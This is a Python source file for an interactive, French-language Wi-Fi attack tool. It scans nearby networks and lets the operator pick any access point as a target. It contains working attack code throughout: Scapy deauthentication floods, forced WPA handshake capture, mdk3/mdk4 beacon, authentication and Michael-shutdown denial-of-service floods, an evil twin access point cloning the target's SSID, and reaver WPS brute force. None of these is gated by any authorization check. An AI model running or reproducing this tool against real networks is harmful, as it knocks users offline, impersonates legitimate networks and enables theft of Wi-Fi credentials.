#!/usr/bin/env python3
import subprocess, os, csv, time, sys, signal
import glob as glob_module
from pathlib import Path
from threading import Thread
from scapy.all import *

# === Couleurs ===
RED    = "\033[1;31m"
ORANGE = "\033[1;33m"
YELLOW = "\033[93m"
GREEN  = "\033[1;32m"
BLUE   = "\033[1;34m"
CYAN   = "\033[1;36m"
RESET  = "\033[0m"

# === Constantes ===
SCAN_FILE_PREFIX = "/tmp/scan"
HANDSHAKE_DIR = "/tmp/handshakes"

# === Variables globales ===
active_processes = []

# === Gestion des signaux ===
def signal_handler(sig, frame):
    print(f"\n{YELLOW}[!] Interruption détectée. Nettoyage...{RESET}")
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# === Bannière ===
def print_banner():
    print(RED + r"""
███▄ ▄███▓ ▄▄▄       ▄████▄    █████▒██▓  ▄████  ██░ ██ ▄▄▄█████▓
▓██▒▀█▀ ██▒▒████▄    ▒██▀ ▀█  ▓██   ▒▓██▒ ██▒ ▀█▒▓██░ ██▒▓  ██▒ ▓▒
▓██    ▓██░▒██  ▀█▄  ▒▓█    ▄ ▒████ ░▒██▒▒██░▄▄▄░▒██▀▀██░▒ ▓██░ ▒░
▒██    ▒██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒░▓█▒  ░░██░░▓█  ██▓░▓█ ░██ ░ ▓██▓ ░ 
▒██▒   ░██▒ ▓█   ▓██▒▒ ▓███▀ ░░▒█░   ░██░░▒▓███▀▒░▓█▒░██▓  ▒██▒ ░ 
░ ▒░   ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░ ▒ ░   ░▓   ░▒   ▒  ▒ ░░▒░▒  ▒ ░░   
░  ░      ░  ▒   ▒▒ ░  ░  ▒    ░      ▒ ░  ░   ░  ▒ ░▒░ ░    ░    
░      ░     ░   ▒   ░         ░ ░    ▒ ░░ ░   ░  ░  ░░ ░  ░      
       ░         ░  ░░ ░              ░        ░  ░  ░  ░          
""" + RESET)
    print(f"{ORANGE}                    Developed by H8Laws{RESET}")
    print(f"{CYAN}                  Enhanced Pentest Edition v2.0{RESET}\n")

# === Vérification des dépendances ===
def check_dependencies():
    deps = {
        "airmon-ng": "aircrack-ng",
        "airodump-ng": "aircrack-ng", 
        "aireplay-ng": "aircrack-ng",
        "mdk3": "mdk3",
        "mdk4": "mdk4",
        "hostapd": "hostapd",
        "dnsmasq": "dnsmasq"
    }
    missing = []
    for cmd, pkg in deps.items():
        if subprocess.run(["which", cmd], capture_output=True).returncode != 0:
            missing.append(f"{cmd} ({pkg})")
    
    if missing:
        print(f"{RED}[-] Dépendances manquantes:{RESET}")
        for m in missing:
            print(f"    {YELLOW}•{RESET} {m}")
        print(f"\n{ORANGE}[!] Note: mdk4 est recommandé (plus stable que mdk3){RESET}")
        return False
    return True

# === Nettoyer les processus et fichiers ===
def cleanup():
    global active_processes
    for proc in active_processes:
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except:
            try:
                proc.kill()
            except:
                pass
    active_processes = []
    
    # Nettoyer les fichiers temporaires
    for f in ["/tmp/hostapd.conf", "/tmp/dnsmasq.conf", "/tmp/bssid_list.txt"]:
        try:
            os.remove(f)
        except:
            pass

# === Nettoyer les anciens fichiers de scan ===
def clean_scan_files():
    for file in glob_module.glob(f"{SCAN_FILE_PREFIX}-*.csv"):
        try:
            os.remove(file)
        except Exception as e:
            print(f"{RED}[-] Erreur suppression {file} : {e}{RESET}")

# === Récupérer les interfaces Wi-Fi ===
def get_interfaces():
    result = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode()
    interfaces = []
    for line in result.splitlines():
        if "IEEE 802.11" in line:
            iface = line.split()[0]
            interfaces.append(iface)
    return interfaces

# === Passer en mode monitor ===
def enable_monitor_mode(interface):
    # Arrêter les processus conflictuels
    subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    if interface.endswith("mon"):
        subprocess.run(["airmon-ng", "stop", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        interface = interface[:-3]

    print(f"{GREEN}[+] Activation du mode monitor sur {interface}...{RESET}")
    result = subprocess.run(["airmon-ng", "start", interface], 
                          capture_output=True, text=True)

    # Attendre un peu pour que l'interface soit prête
    time.sleep(2)

    # Détecter l'interface monitor
    iwconfig_result = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode()
    mon_iface = None
    for line in iwconfig_result.splitlines():
        if "Mode:Monitor" in line:
            mon_iface = line.split()[0]
            break

    if mon_iface:
        print(f"{GREEN}[+] Interface monitor détectée : {mon_iface}{RESET}")
        return mon_iface
    else:
        print(f"{RED}[-] Impossible de détecter l'interface monitor !{RESET}")
        return None

# === Revenir en mode normal ===
def disable_monitor_mode(mon_iface):
    if mon_iface and mon_iface.endswith("mon"):
        print(f"{GREEN}[+] Désactivation du mode monitor sur {mon_iface}...{RESET}")
        subprocess.run(["airmon-ng", "stop", mon_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # Redémarrer NetworkManager
        subprocess.run(["systemctl", "start", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# === Lancer le scan airodump ===
def run_airodump(interface, duration=15):
    clean_scan_files()
    print(f"{YELLOW}[+] Scan en cours pendant {duration} secondes...{RESET}")
    print(f"{CYAN}[*] Appuyez sur Ctrl+C pour arrêter plus tôt{RESET}")
    
    proc = subprocess.Popen([
        "airodump-ng", "-w", SCAN_FILE_PREFIX,
        "--output-format", "csv", interface
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    try:
        time.sleep(duration)
        proc.terminate()
    except KeyboardInterrupt:
        proc.terminate()
    
    proc.wait()
    return proc

# === Lire les résultats du scan ===
def parse_scan_results(filename):
    aps = []
    clients = {}
    
    if not os.path.exists(filename):
        return aps, clients
        
    with open(filename, "r", encoding="utf-8", errors="ignore") as f:
        reader = csv.reader(f)
        section = 0
        for row in reader:
            if len(row) < 1:
                continue
            if row[0].strip().startswith("BSSID"):
                section = 1
                continue
            elif row[0].strip().startswith("Station MAC"):
                section = 2
                continue

            if section == 1 and len(row) > 13:
                essid = row[13].strip()
                bssid = row[0].strip()
                if not bssid or bssid == "BSSID":
                    continue
                if essid == "":
                    essid = "<hidden>"
                    
                aps.append({
                    "bssid": bssid,
                    "channel": row[3].strip(),
                    "essid": essid,
                    "power": row[8].strip(),
                    "encryption": row[5].strip()
                })
                clients[bssid] = []
                
            elif section == 2 and len(row) > 5:
                client_mac = row[0].strip()
                ap_mac = row[5].strip()
                if client_mac and ap_mac and ap_mac in clients:
                    clients[ap_mac].append(client_mac)
    
    return aps, clients

# === Affichage de la liste des réseaux ===
def print_ap_list(aps, clients):
    print(f"\n{BLUE}{'NUM':<5} {'ESSID':<25} {'CH':<4} {'PWR':<6} {'ENC':<12} {'CLIENTS':<8} {'BSSID':<17}{RESET}")
    print(f"{BLUE}{'='*90}{RESET}")
    
    for i, ap in enumerate(aps):
        try:
            power = int(ap['power']) if ap['power'].lstrip('-').isdigit() else -100
        except:
            power = -100
            
        power_color = GREEN if power > -70 else ORANGE if power > -85 else RED
        client_count = len(clients.get(ap['bssid'], []))
        
        print(f"{YELLOW}{i+1:<5}{RESET} "
              f"{CYAN}{ap['essid']:<25}{RESET} "
              f"{YELLOW}{ap['channel']:<4}{RESET} "
              f"{power_color}{ap['power']:<6}{RESET} "
              f"{BLUE}{ap['encryption']:<12}{RESET} "
              f"{GREEN}{client_count:<8}{RESET} "
              f"{BLUE}{ap['bssid']}{RESET}")

# === Configurer le canal ===
def set_channel(interface, channel):
    subprocess.run(["iwconfig", interface, "channel", str(channel)],
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# === 1. Attaque de déauthentification (Scapy) ===
def attack_deauth(ap, clients, interface):
    print(f"\n{GREEN}[+] Attaque de déauthentification sur {ap['essid']}{RESET}")
    set_channel(interface, ap['channel'])
    
    duration_input = input(f"{ORANGE}[?] Durée en secondes (défaut: 90) : {RESET}").strip()
    duration = int(duration_input) if duration_input.isdigit() else 90
    
    client_list = clients.get(ap['bssid'], [])
    
    # Préparer les paquets de déauth
    packets = []
    
    # Paquet broadcast (vers tous les clients non identifiés)
    pkt_broadcast = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap['bssid'], addr3=ap['bssid']) / Dot11Deauth(reason=7)
    packets.append(pkt_broadcast)
    
    if client_list:
        print(f"{CYAN}[*] {len(client_list)} client(s) détecté(s){RESET}")
        print(f"{YELLOW}1.{RESET} Attaquer tous les clients + broadcast")
        print(f"{YELLOW}2.{RESET} Cibler un client spécifique")
        print(f"{YELLOW}3.{RESET} Broadcast uniquement")
        choice = input(f"{ORANGE}[?] Choix : {RESET}").strip()
        
        if choice == "2":
            print(f"\n{CYAN}Clients connectés:{RESET}")
            for idx, client in enumerate(client_list):
                print(f"{YELLOW}{idx+1}.{RESET} {client}")
            client_choice = input(f"{ORANGE}[?] Numéro du client : {RESET}").strip()
            try:
                target_client = client_list[int(client_choice)-1]
                print(f"{GREEN}[+] Ciblage de {target_client}...{RESET}")
                # Paquet vers le client
                pkt_to_client = RadioTap() / Dot11(addr1=target_client, addr2=ap['bssid'], addr3=ap['bssid']) / Dot11Deauth(reason=7)
                # Paquet vers l'AP (du client)
                pkt_to_ap = RadioTap() / Dot11(addr1=ap['bssid'], addr2=target_client, addr3=target_client) / Dot11Deauth(reason=7)
                packets = [pkt_to_client, pkt_to_ap]
            except:
                print(f"{RED}[-] Choix invalide{RESET}")
                return
                
        elif choice == "1":
            print(f"{GREEN}[+] Attaque de tous les clients + broadcast...{RESET}")
            for client_mac in client_list:
                # Paquet vers chaque client
                pkt_to_client = RadioTap() / Dot11(addr1=client_mac, addr2=ap['bssid'], addr3=ap['bssid']) / Dot11Deauth(reason=7)
                # Paquet vers l'AP (de chaque client)
                pkt_to_ap = RadioTap() / Dot11(addr1=ap['bssid'], addr2=client_mac, addr3=client_mac) / Dot11Deauth(reason=7)
                packets.extend([pkt_to_client, pkt_to_ap])
        else:
            print(f"{GREEN}[+] Attaque broadcast uniquement...{RESET}")
    else:
        print(f"{ORANGE}[!] Aucun client détecté, utilisation du mode broadcast{RESET}")
    
    # Thread d'envoi des paquets
    stop_attack = False
    
    def send_loop():
        nonlocal stop_attack
        end_time = time.time() + duration
        packet_count = 0
        print(f"{CYAN}[*] Envoi de paquets de déauthentification...{RESET}")
        
        while time.time() < end_time and not stop_attack:
            for pkt in packets:
                if stop_attack:
                    break
                sendp(pkt, iface=interface, verbose=0)
                packet_count += 1
            time.sleep(0.1)
            
            # Afficher progression toutes les 10 secondes
            if packet_count % 500 == 0:
                elapsed = int(time.time() - (end_time - duration))
                remaining = duration - elapsed
                print(f"{YELLOW}[*] {packet_count} paquets envoyés | Temps restant: {remaining}s{RESET}")
        
        print(f"{GREEN}[+] Attaque terminée. Total: {packet_count} paquets envoyés{RESET}")
    
    # Lancer l'attaque dans un thread
    attack_thread = Thread(target=send_loop)
    attack_thread.daemon = True
    attack_thread.start()
    
    try:
        input(f"\n{YELLOW}[!] Appuyez sur Entrée pour arrêter l'attaque...{RESET}")
        stop_attack = True
        attack_thread.join(timeout=2)
    except KeyboardInterrupt:
        stop_attack = True
        attack_thread.join(timeout=2)

# === 2. Capture de handshake ===
def capture_handshake(ap, clients, interface):
    print(f"\n{GREEN}[+] Capture de handshake pour {ap['essid']}{RESET}")
    
    # Créer le dossier de handshakes
    Path(HANDSHAKE_DIR).mkdir(exist_ok=True)
    
    output_file = f"{HANDSHAKE_DIR}/{ap['essid'].replace(' ', '_')}_{ap['bssid'].replace(':', '')}"
    
    set_channel(interface, ap['channel'])
    
    # Lancer airodump pour capturer
    print(f"{CYAN}[*] Démarrage de la capture...{RESET}")
    capture_proc = subprocess.Popen([
        "airodump-ng", "-c", ap['channel'],
        "--bssid", ap['bssid'],
        "-w", output_file,
        interface
    ])
    active_processes.append(capture_proc)
    
    time.sleep(3)
    
    # Demander si on veut forcer avec deauth
    force = input(f"{ORANGE}[?] Forcer avec une attaque de déauth? (y/N) : {RESET}").strip().lower()
    
    if force == 'y':
        print(f"{GREEN}[+] Envoi de paquets de déauthentification...{RESET}")
        if clients.get(ap['bssid']):
            for client in clients[ap['bssid']]:
                subprocess.Popen([
                    "aireplay-ng", "--deauth", "10",
                    "-a", ap['bssid'], "-c", client, interface
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            subprocess.Popen([
                "aireplay-ng", "--deauth", "10",
                "-a", ap['bssid'], interface
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    input(f"\n{YELLOW}[!] Appuyez sur Entrée pour arrêter la capture...{RESET}")
    cleanup()
    
    print(f"{GREEN}[+] Capture sauvegardée dans {output_file}-*.cap{RESET}")

# === 3. Attaque par flood (DoS) ===
def attack_flood(ap, interface):
    print(f"\n{GREEN}[+] Attaque par flood sur {ap['essid']}{RESET}")
    set_channel(interface, ap['channel'])
    
    # Vérifier mdk4 d'abord (plus stable)
    mdk_cmd = "mdk4" if subprocess.run(["which", "mdk4"], capture_output=True).returncode == 0 else "mdk3"
    
    print(f"{CYAN}[*] Utilisation de {mdk_cmd}{RESET}")
    print(f"{YELLOW}1.{RESET} Beacon Flood (saturation de faux AP)")
    print(f"{YELLOW}2.{RESET} Authentication DoS")
    print(f"{YELLOW}3.{RESET} Deauthentication Flood")
    print(f"{YELLOW}4.{RESET} Michael Shutdown Exploitation")
    
    choice = input(f"{ORANGE}[?] Type d'attaque : {RESET}").strip()
    
    # Créer fichier BSSID
    with open("/tmp/bssid_list.txt", "w") as f:
        f.write(ap['bssid'] + "\n")
    
    if choice == "1":
        # Beacon flood
        proc = subprocess.Popen([mdk_cmd, interface, "b", "-c", ap['channel']])
    elif choice == "2":
        # Auth DoS
        proc = subprocess.Popen([mdk_cmd, interface, "a", "-a", ap['bssid']])
    elif choice == "3":
        # Deauth flood
        proc = subprocess.Popen([mdk_cmd, interface, "d", "-b", "/tmp/bssid_list.txt", "-c", ap['channel']])
    elif choice == "4":
        # Michael shutdown
        proc = subprocess.Popen([mdk_cmd, interface, "m", "-t", ap['bssid']])
    else:
        print(f"{RED}[-] Choix invalide{RESET}")
        return
    
    active_processes.append(proc)
    input(f"\n{YELLOW}[!] Appuyez sur Entrée pour arrêter l'attaque...{RESET}")
    cleanup()

# === 4. Evil Twin / Rogue AP ===
def attack_evil_twin(ap, interface):
    print(f"\n{GREEN}[+] Création d'un Evil Twin pour {ap['essid']}{RESET}")
    
    # Configuration hostapd
    hostapd_conf = f"""interface={interface}
driver=nl80211
ssid={ap['essid']}
hw_mode=g
channel={ap['channel']}
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""
    
    with open("/tmp/hostapd.conf", "w") as f:
        f.write(hostapd_conf)
    
    # Configuration dnsmasq pour DHCP
    dnsmasq_conf = f"""interface={interface}
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
"""
    
    with open("/tmp/dnsmasq.conf", "w") as f:
        f.write(dnsmasq_conf)
    
    print(f"{CYAN}[*] Configuration de l'interface...{RESET}")
    subprocess.run(["ifconfig", interface, "192.168.1.1", "netmask", "255.255.255.0"])
    
    print(f"{GREEN}[+] Démarrage de hostapd...{RESET}")
    hostapd_proc = subprocess.Popen([
        "hostapd", "/tmp/hostapd.conf"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    active_processes.append(hostapd_proc)
    
    time.sleep(2)
    
    print(f"{GREEN}[+] Démarrage de dnsmasq...{RESET}")
    dnsmasq_proc = subprocess.Popen([
        "dnsmasq", "-C", "/tmp/dnsmasq.conf", "-d"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    active_processes.append(dnsmasq_proc)
    
    print(f"{GREEN}[+] Evil Twin actif !{RESET}")
    print(f"{CYAN}[*] SSID: {ap['essid']}{RESET}")
    print(f"{CYAN}[*] Password: password123{RESET}")
    print(f"{CYAN}[*] Les clients qui se connectent obtiendront une IP 192.168.1.x{RESET}")
    
    input(f"\n{YELLOW}[!] Appuyez sur Entrée pour arrêter...{RESET}")
    cleanup()

# === 5. WPS Attack ===
def attack_wps(ap, interface):
    print(f"\n{GREEN}[+] Attaque WPS sur {ap['essid']}{RESET}")
    
    # Vérifier si reaver est installé
    if subprocess.run(["which", "reaver"], capture_output=True).returncode != 0:
        print(f"{RED}[-] Reaver n'est pas installé !{RESET}")
        print(f"{ORANGE}[!] Installez-le avec: apt install reaver{RESET}")
        return
    
    set_channel(interface, ap['channel'])
    
    print(f"{CYAN}[*] Démarrage de l'attaque WPS...{RESET}")
    print(f"{YELLOW}[!] Ceci peut prendre plusieurs heures{RESET}")
    
    proc = subprocess.Popen([
        "reaver", "-i", interface,
        "-b", ap['bssid'],
        "-c", ap['channel'],
        "-vv", "-L", "-N"
    ])
    active_processes.append(proc)
    
    input(f"\n{YELLOW}[!] Appuyez sur Entrée pour arrêter...{RESET}")
    cleanup()

# === Menu d'attaque ===
def attack_menu(ap, clients, interface):
    while True:
        print(f"\n{BLUE}{'='*60}{RESET}")
        print(f"{CYAN}Target: {ap['essid']} ({ap['bssid']}){RESET}")
        print(f"{CYAN}Channel: {ap['channel']} | Power: {ap['power']} dBm | Clients: {len(clients.get(ap['bssid'], []))}{RESET}")
        print(f"{BLUE}{'='*60}{RESET}")
        print(f"{YELLOW}1.{RESET} Déauthentification (Deauth)")
        print(f"{YELLOW}2.{RESET} Capture de Handshake")
        print(f"{YELLOW}3.{RESET} Attaque par Flood (DoS)")
        print(f"{YELLOW}4.{RESET} Evil Twin / Rogue AP")
        print(f"{YELLOW}5.{RESET} WPS Attack (Reaver)")
        print(f"{YELLOW}6.{RESET} Rescanner les réseaux")
        print(f"{YELLOW}0.{RESET} Retour")
        
        choice = input(f"{ORANGE}[?] Choix : {RESET}").strip()
        
        if choice == "1":
            attack_deauth(ap, clients, interface)
        elif choice == "2":
            capture_handshake(ap, clients, interface)
        elif choice == "3":
            attack_flood(ap, interface)
        elif choice == "4":
            attack_evil_twin(ap, interface)
        elif choice == "5":
            attack_wps(ap, interface)
        elif choice == "6":
            return "rescan"
        elif choice == "0":
            break
        else:
            print(f"{RED}[-] Choix invalide !{RESET}")

# === Programme principal ===
def main():
    # Vérifier root
    if os.geteuid() != 0:
        print(f"{RED}[-] Ce script doit être exécuté en tant que root !{RESET}")
        sys.exit(1)
    
    print_banner()
    
    # Vérifier les dépendances
    if not check_dependencies():
        print(f"\n{RED}[-] Veuillez installer les dépendances manquantes{RESET}")
        sys.exit(1)
    
    # Sélection de l'interface
    interfaces = get_interfaces()
    if not interfaces:
        print(f"{RED}[-] Aucune interface Wi-Fi détectée !{RESET}")
        return
    
    print(f"{BLUE}Interfaces disponibles:{RESET}")
    for i, iface in enumerate(interfaces):
        print(f"{YELLOW} {i+1}.{RESET} {iface}")
    
    choice = input(f"{ORANGE}[?] Sélectionnez une interface (1-{len(interfaces)}): {RESET}").strip()
    try:
        iface = interfaces[int(choice)-1]
    except:
        print(f"{RED}[-] Choix invalide !{RESET}")
        return

    # Activer le mode monitor
    mon_iface = enable_monitor_mode(iface)
    if not mon_iface:
        print(f"{RED}[-] Impossible d'activer le mode monitor{RESET}")
        return

    try:
        while True:
            # Scanner les réseaux
            run_airodump(mon_iface)
            
            # Parser les résultats
            csv_file = f"{SCAN_FILE_PREFIX}-01.csv"
            aps, clients = parse_scan_results(csv_file)
            
            if not aps:
                print(f"{RED}[-] Aucun réseau détecté !{RESET}")
                retry = input(f"{ORANGE}[?] Rescanner? (y/N): {RESET}").strip().lower()
                if retry != 'y':
                    break
                continue
            
            # Afficher les réseaux
            print_ap_list(aps, clients)
            
            # Sélection du réseau
            choice = input(f"\n{ORANGE}[?] Sélectionnez le réseau (num) ou 'r' pour rescanner: {RESET}").strip()
            
            if choice.lower() == 'r':
                continue
            
            try:
                ap = aps[int(choice)-1]
            except:
                print(f"{RED}[-] Choix invalide !{RESET}")
                continue
            
            # Menu d'attaque
            result = attack_menu(ap, clients, mon_iface)
            if result != "rescan":
                break
                
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Interruption...{RESET}")
    finally:
        cleanup()
        disable_monitor_mode(mon_iface)
        print(f"\n{GREEN}[+] Nettoyage terminé. Au revoir !{RESET}")

if __name__ == "__main__":
    main()